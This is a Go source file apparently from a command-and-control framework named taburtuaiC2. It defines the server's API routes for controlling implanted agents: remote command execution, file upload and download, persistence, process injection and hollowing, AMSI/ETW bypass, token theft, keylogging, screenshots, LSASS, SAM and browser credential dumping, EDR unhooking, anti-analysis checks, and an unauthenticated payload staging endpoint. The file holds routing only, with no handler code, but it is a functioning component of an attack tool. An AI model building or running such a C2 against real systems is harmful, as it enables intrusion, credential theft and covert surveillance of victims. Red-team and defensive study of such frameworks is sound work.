package api

import (
	"net/http"

	"github.com/gin-gonic/gin"
	"github.com/mjopsec/taburtuaiC2/internal/core"
)

// Router handles API routing
type Router struct {
	server     *core.Server
	handlers   *Handlers
	middleware *Middleware
}

// NewRouter creates a new router
func NewRouter(server *core.Server) *Router {
	return &Router{
		server:     server,
		handlers:   NewHandlers(server),
		middleware: NewMiddleware(server),
	}
}

// Setup configures all routes
func (r *Router) Setup() *gin.Engine {
	router := gin.New()

	// Global middleware - ORDER MATTERS!
	router.Use(gin.Recovery())                                  // Gin's built-in recovery
	router.Use(r.middleware.ErrorRecovery())                    // Our enhanced recovery
	router.Use(r.middleware.SecurityHeaders())                  // Security headers first
	router.Use(r.middleware.CORS())                             // CORS handling
	router.Use(r.middleware.RequestSizeLimit(10 * 1024 * 1024)) // 10MB limit for most requests
	router.Use(r.middleware.ValidateContentType())              // Content-Type validation
	router.Use(r.middleware.Logging())                          // Request logging
	router.Use(r.middleware.RateLimit())                        // Rate limiting
	router.Use(r.middleware.Auth())                             // Authentication (last before routes)

	// Static files
	router.Static("/static", "./web/static")
	router.LoadHTMLGlob("web/templates/*")
	router.GET("/", r.handlers.Dashboard)

	// API v1 routes
	v1 := router.Group("/api/v1")
	{
		// Agent management
		v1.GET("/agents", r.handlers.ListAgents)
		v1.GET("/agents/:id", r.handlers.GetAgent)
		v1.DELETE("/agents/:id", r.handlers.RemoveAgent)
		v1.POST("/checkin", r.handlers.AgentCheckin)

		// Command execution
		v1.POST("/command", r.handlers.ExecuteCommand)
		v1.GET("/command/:id/next", r.handlers.GetNextCommand)
		v1.POST("/command/result", r.handlers.SubmitCommandResult)
		v1.GET("/command/:id/status", r.handlers.GetCommandStatus)

		// Agent commands
		v1.GET("/agent/:id/commands", r.handlers.GetAgentCommands)
		v1.DELETE("/agent/:id/queue", r.handlers.ClearAgentQueue)

		// File operations (with higher size limits)
		fileGroup := v1.Group("/agent/:id")
		{
			// Remove size limit for file uploads specifically
			fileGroup.POST("/upload", func(c *gin.Context) {
				// Remove the general size limit for this endpoint
				c.Request.Body = http.MaxBytesReader(c.Writer, c.Request.Body, 100*1024*1024) // 100MB for uploads
				r.handlers.UploadToAgent(c)
			})
			fileGroup.POST("/download", r.handlers.DownloadFromAgent)
		}

		// Process management
		process := v1.Group("/agent/:id/process")
		{
			process.POST("/list", r.handlers.ListProcesses)
			process.POST("/kill", r.handlers.KillProcess)
			process.POST("/start", r.handlers.StartProcess)
		}

		// Persistence
		persist := v1.Group("agent/:id/persistence/")
		{
			persist.POST("/setup", r.handlers.SetupPersistence)
			persist.POST("/remove", r.handlers.RemovePersistence)
		}

		// ADS & LOLBin (Level 1 evasion)
		v1.POST("/agent/:id/ads/exec", r.handlers.ADSExec)
		v1.POST("/agent/:id/fetch", r.handlers.LOLBinFetch)

		// Level 2 evasion
		v1.POST("/agent/:id/inject/remote", r.handlers.InjectRemote)
		v1.POST("/agent/:id/inject/self", r.handlers.InjectSelf)
		v1.POST("/agent/:id/timestomp", r.handlers.Timestomp)
		v1.POST("/agent/:id/process/ppid", r.handlers.PPIDSpawn)

		// Phase 3 — AMSI/ETW bypass
		v1.POST("/agent/:id/bypass/amsi", r.handlers.AMSIBypass)
		v1.POST("/agent/:id/bypass/etw", r.handlers.ETWBypass)

		// Phase 3 — Token manipulation
		v1.POST("/agent/:id/token/list", r.handlers.TokenList)
		v1.POST("/agent/:id/token/steal", r.handlers.TokenSteal)
		v1.POST("/agent/:id/token/make", r.handlers.TokenMake)
		v1.POST("/agent/:id/token/revert", r.handlers.TokenRevert)

		// Phase 3 — Reconnaissance
		v1.POST("/agent/:id/screenshot", r.handlers.Screenshot)
		v1.POST("/agent/:id/keylog/start", r.handlers.KeylogStart)
		v1.POST("/agent/:id/keylog/dump", r.handlers.KeylogDump)
		v1.POST("/agent/:id/keylog/stop", r.handlers.KeylogStop)

		// Phase 4 — Advanced injection
		v1.POST("/agent/:id/inject/hollow", r.handlers.Hollow)
		v1.POST("/agent/:id/inject/hijack", r.handlers.Hijack)
		v1.POST("/agent/:id/inject/stomp", r.handlers.Stomp)
		v1.POST("/agent/:id/inject/map", r.handlers.MapInject)

		// Phase 5 — Credential access
		v1.POST("/agent/:id/creds/lsass", r.handlers.LSASSDump)
		v1.POST("/agent/:id/creds/sam", r.handlers.SAMDump)
		v1.POST("/agent/:id/creds/browser", r.handlers.BrowserCreds)
		v1.POST("/agent/:id/creds/clipboard", r.handlers.ClipboardRead)

		// Phase 6-7 — Evasion
		v1.POST("/agent/:id/evasion/sleep", r.handlers.SleepObf)
		v1.POST("/agent/:id/evasion/unhook", r.handlers.UnhookNTDLL)

		// Phase 8 — Hardware breakpoints
		v1.POST("/agent/:id/evasion/hwbp/set", r.handlers.HWBPSet)
		v1.POST("/agent/:id/evasion/hwbp/clear", r.handlers.HWBPClear)

		// Phase 9 — BOF execution
		v1.POST("/agent/:id/bof", r.handlers.BOFExec)

		// Phase 10 — OPSEC
		v1.POST("/agent/:id/opsec/antidebug", r.handlers.AntiDebug)
		v1.POST("/agent/:id/opsec/antivm", r.handlers.AntiVM)
		v1.POST("/agent/:id/opsec/timegate", r.handlers.TimeGateSet)

		// Stage management (operator)
		v1.POST("/stage", r.handlers.CreateStage)
		v1.GET("/stages", r.handlers.ListStages)
		v1.DELETE("/stage/:token", r.handlers.DeleteStage)

		// Monitoring
		v1.GET("/stats", r.handlers.GetStats)
		v1.GET("/health", r.handlers.HealthCheck)
		v1.GET("/logs", r.handlers.GetLogs)
		v1.GET("/queue/stats", r.handlers.GetQueueStats)
	}

	// Public stage delivery endpoint — no auth, token is the credential
	router.GET("/stage/:token", r.handlers.ServeStage)

	return router
}
